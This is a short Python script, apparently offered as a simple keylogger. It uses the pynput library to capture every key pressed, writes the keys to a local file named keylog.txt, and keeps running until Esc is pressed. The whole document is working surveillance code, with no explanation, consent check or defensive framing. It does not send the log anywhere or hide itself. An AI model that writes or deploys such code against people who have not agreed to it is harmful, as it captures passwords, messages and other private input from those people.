import pynput.keyboard

# Function to write the keys to a log file
def write_to_file(key):
    key_data = str(key)
    with open("keylog.txt", "a") as f:
        f.write(key_data)
        
# Function to handle the pressing of keys
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        if key == key.space:
            write_to_file(" ")
        else:
            write_to_file(" [" + str(key) + "] ")

# Function to handle releasing of keys
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

# Start listening for key presses
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
